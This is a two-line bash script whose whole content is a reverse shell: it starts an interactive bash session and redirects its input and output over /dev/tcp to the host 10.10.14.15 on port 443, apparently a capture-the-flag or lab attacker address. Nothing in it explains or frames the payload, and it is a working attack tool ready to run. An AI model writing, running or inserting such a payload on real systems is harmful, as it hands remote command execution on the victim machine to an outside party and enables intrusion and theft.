#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"
